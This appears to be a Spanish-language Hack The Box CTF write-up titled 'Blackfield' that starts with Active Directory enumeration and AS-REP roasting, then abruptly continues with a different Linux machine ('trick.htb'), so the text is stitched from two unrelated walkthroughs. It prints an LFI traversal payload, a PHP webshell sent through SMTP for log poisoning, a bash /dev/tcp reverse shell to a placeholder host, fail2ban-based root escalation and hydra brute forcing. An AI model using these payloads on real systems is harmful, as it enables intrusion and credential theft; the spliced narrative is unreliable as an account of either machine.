# Blackfield
![maquina](images/00_machine.png)

| Plataforma | Rating | Sistema Operativo |
|------------|------------|-------------------|
| Hack The Box | ⭐⭐⭐⭐☆ | Windows |

---

# 📋 Información

- **IP:** `10.129.229.17`
- **Objetivo:** Obtener acceso y escalar privilegios hasta `NT/AUTORITY SYSTEM`.

---

# 🔍 Reconocimiento

## Descubrimiento de puertos

Siempre hay que empezar escaneando los puertos de la máquina víctima

```bash
nmap -Pn -p- --min-rate 5000 -sS -n -vvv <IP> -oN allPorts
```

![Escaneo completo de puertos](images/01_nmap_all_ports.png)

---

## Enumeración de servicios

```bash
nmap -sCV -p<PUERTOS> <IP> -oN services
```
```text
Tenemos activos los siguientes puertos:
- 88: Kerberos
- 53: DNS
- 135: RPC
- 445: SMB
- 5985: Winrm
```

![Enumeración de servicios](images/02_nmap_services.png)

---

# 🌐 Enumeración SMB

Vamos a enumerar el protocolo smb en busca de información interesante con netexec

![ntx](images/03_ntx.png)

Vemos que es un windows server 2019 y que tenemos un dominio llamado **blackfield.local**
Añadiremos el dominio al archivo /etc/hosts.

Ahora vamos a enumerar con una NULL session poniendo cualquier usuario los permisos que tenemos en smb.

```bash
smbmap -H <IP> -u 'test'
```
![smbmap](images/04_smbmap.png)

Vemos que tenemos permisos para ver el profiles$ por lo que podemos listar los usuarios que usan este servicio.
Los copiamos de la siguiente forma:

```bash
smbmap -H 10.129.229.17 -u 'test' -r 'profiles$' | awk 'NF{print $NF}' > lista_usuarios
```

Ahora tenemos que entrar al archivo y borrar las primeras lineas que sobran 

![lista](images/05_lista_usuarios.png)

# 🦮 Kerbrute
Ahora tenemos una lista, vamos a comprobar los usuarios válidos del dominio, para ello usaremos la herramienta kerbrute

```bash
kerbrute --dc 10.129.229.17 -d blackfield.local userenum lista_usuarios
```

![kerbrute](images/06_kerbrute.png)

Vemos que un usuario nos da un TGT, no le vamos a hacer mucho caso a eso, lo que vamos a hacer es apuntarnos los usuarios encontrados en otra lista.

# 🎯 ASREPROAST

Ahora vamos a hacer un ataque ASREPROAST para intentar conseguir un TGT, cuando lo consigamos lo descifraremos con la herramienta john.

![asreproast](images/07_asreproast.png)

Ahora que tenemos un usuario y credencial podemos probar un Kerberoasting attack

```bash
$ impacket-GetUserSPNs 'blackfield.local/support:#00^BlackKnight'
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
```
Pero en este caso no nos da un TGS

Con netexec vamos a comprobar si el usuario y las credenciales del smb son válidas

```bash
❯ netexec smb 10.129.229.17 -u 'support' -p '#00^BlackKnight'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
```
En este caso pone un + y eso significa que si son válidas. Si pusiera pwned con impacket-psexec podríamos crearnos una consola de comandos.

# 🌐 Enumeración smb 2

Ahora que tenemos un usuario vamos a ver si tiene algo en el directorio profiles

```bash
❯ smbmap -H 10.129.229.17 -u 'support%#00^BlackKnight' -r 'profiles$/support'
[+] Guest session   	IP: 10.129.229.17:445	Name: blackfield.local                                  
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	profiles$                                         	READ ONLY	
	.\profiles$support\*
	dr--r--r--                0 Wed Jun  3 18:47:12 2020	.
	dr--r--r--                0 Wed Jun  3 18:47:12 2020	..
```
Pero vemos que no es el caso.

Vamos a usar una herramienta llamada ldapdomaindump que sirve para dumpear información del dominio cuando tenemos un usuario y credenciales válidas

```bash
ldapdomaindump -u '<DOMINIO>\<USUARIO>' -p '<CONSTRASEÑA>' <IP>
```

Con esto se nos generarán varios archivos html.
Ahora nos montamos un servidor web para poder verlos correctamente

```bash
python3 -m http.server 80
```
Y vamos a http://127.0.0.1/domain_users_by_group.html#cn_Administrators

# 🌐 Enumeración web 3

El subdominio contiene una web que si exploramos vemos una ruta que está contemplada de una manera muy extraña
Pues hace una llamada a un service.html de esta forma http://preprod-marketing.trick.htb/index.php?page=services.html en vez de esta http://preprod-marketing.trick.htb/services.html.

![web3](images/10_web3.png)

Esto puede significar que hay un LFI

# 🎯 Acceso inicial

## Vulnerabilidad

LFI (Local File Inclusion) es una vulnerabilidad que permite a un atacante incluir y, en algunos casos, ejecutar archivos locales del servidor mediante la manipulación de parámetros de entrada.

Vamos a comprobarla intentando leer el /etc/passwd de la máquina víctima.

```bash
http://preprod-marketing.trick.htb/index.php?page=/etc/passwd
```

En este caso no nos reporta nada

![LFI1](images/11_LFI1.png)

Vamos a probar unas técnicas de evasión. Para ello le añadiremos ....//....//....//....//....//....//etc/passwd

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//etc/passwd
```
Y en este caso hemos conseguido leer el archivo /etc/passwd.

![passwd](images/19_passwd.png)

Ahora lo que necesitamos es ejecutar remotamente comandos o ganar directamente acceso al sistema.
Para ello intentaremos robar la clave id_rsa del usuario michael que hemos visto en el archivo /etc/passwd

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa
```

![id_rsa2](images/20_id_rsa_desord.png)

La vemos pero está desordenada, para ello hacemos un view-source de la url de la siguiente forma

```bash
view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa
```
Vemos que podemos acceder a ella. Nos la copiaremos en nuestro sistema

![id_rsa](images/12_id_rsa.png)

Ahora le damos permisos de ejecución

```bash
chmod 600 id_rsa
```
Y la utilizamos para ganar acceso al sistema como el usuario michael

```bash
ssh -i id_rsa michael@<IP>
```

![ssh](images/13_ssh.png)

---
# Intrusión alternativa

## Vulnerabilidad

Hay otra forma de conseguir la ejecución remota de comandos sin la id_rsa y es mediante el envenenamiento de logs (log poisoning).

El Log Poisoning es una técnica de ataque que permite a un atacante manipular los archivos de registro de una aplicación web para lograr un resultado malintencionado. Esta técnica se puede utilizar en conjunto con una vulnerabilidad LFI para ejecutar comandos remotamente en el servidor.

Aprovechando que tenemos el puerto 25 smtp abierto, vamos a conectarnos a el a traves de telnet.

```bash
telnet <IP> <PUERTO>
```
El ataque va a consistir en enviarle un mail al usuario michael con un payload que nos va a permitir ejecutar comandos a traves del LFI

```txt
-MAIL FROM: usuario cualquiera
-RCPT TO: usuario en el que tengamos el LFI
-DATA
-`<?php system($_GET['cmd']); ?>`
-.
-QUIT
-Tenemos que cerrar el DATA con un .
```
![ssh](images/14_telnet.png)

Ahora vamos al navegador y a la siguiente ruta

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=id
```
Tenemos que concatenar el &cmd que es el parametro que le hemos puesto al payload en php.
A priori no vemos nada pero si hacemos un view_source en la url veremos el comando ejecutado correctamente

```bash
view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=id
```
![rce](images/15_RCE.png)

Ya con esto nos montamos una reverse shell a nuestra máquina host.
Primero nos ponemos en escucha por el puerto 4444

```bash
nc -nlvp 4444
```
 y ahora colocamos el siguiente payload en la url

```bash
bash -c "bash -i >%26 /dev/tcp/<IP_HOST>/4444 0>%261"
```

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=bash -c "bash -i >%26 /dev/tcp/<IP_HOST>/4444 0>%261"
```

![rev_shell](images/16_reverse_shell.png)

Ya por ultimo haremos un tratamiento de la tty para que la consola no de fallos 

```bash
script -c bash /dev/null
```
Hacemos un ctrl + z para dejarlo en segundo plano

```bash
stty raw -echo ; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```
Ya con esto tenemos acceso al sistema de dos formas diferentes como el usuario michael

---

# 🔎 Enumeración interna

## Usuario actual

Hacemos un id para ver a que grupo pertenece michael

```bash
id
```
Y pertenece al grupo michael y security.

Vamos a hacer un sudo -l para ver que permisos tenemos asignados.

```bash
michael@trick:~/Desktop$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
Vemos que podemos reiniciar como root el servicio fail2ban

### 🛡️ fail2ban
Fail2ban es una herramienta de seguridad para servidores Linux que ayuda a proteger tu servidor contra ataques de fuerza bruta. Funciona monitoreando los registros de varios servicios, como SSH, FTP, Apache, entre otros, en busca de intentos de inicio de sesión fallidos. Cuando detecta un número predefinido de intentos fallidos desde la misma dirección IP, bloquea temporalmente esa 
dirección IP, ya que considera que se están ataques de fuerza bruta. De esta manera dificulta que un atacante continúe con sus intentos de acceso no autorizado.

Vamos a ver si tenemos algun tipo de permisos de escritura en los archivos de configuración del servicio.

Si echamos un vistazo a la ruta /etc/fail2ban veremos que tenemos permisos de escritura en el directorio action.d gracias a que pertenecemos al grupo security.

- - -
# 🚀 Escalada de privilegios

El ataque va a consistir en cambiar el archivo de configuración que se encargue de ejecutar una acción cuando detecte fuerza bruta y colocarle un comando para escalar privilegios

Si investigamos la herramienta encontamos que el archivo que se encarga de eso es el iptables-multiport.conf

Nos lo copiaremos al directorio /tmp

```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp
```

Ahora lo vamos a editar.

La parte que se encarga de las acciones y bloqueos es el actionban.
Ahi le vamos a poner el comando que va a asignar a la bash permisos SUID para que podamos ejecutar una como root

![iptables-multiport.conf](images/17_archivo_configuración.png)

Ahora solo nos queda moverlo al directorio action.d

```bash
mv iptables-multiport.conf /etc/fail2ban/action.d/
```
Reiniciamos el servicio

```bash
/etc/init.d/fail2ban restart
```
Y ahora vamos a intentar iniciarnos por ssh a root de forma fallida muchas veces

```
ssh root@<IP>
```

Esto se puede automatizar con hydra

```bash
hydra -u root -P /usr/share/wordlists/rockyou.txt <IP> ssh
```

Cuando lo hagamos un rato, hacemos un ls -l de la bash para ver si tiene los permisos suid.
Vemos que lo tiene asi que terminamos ejecutando una bash con altos privilegios

```bash
bash -p
```

![root](images/18_root.png)

---
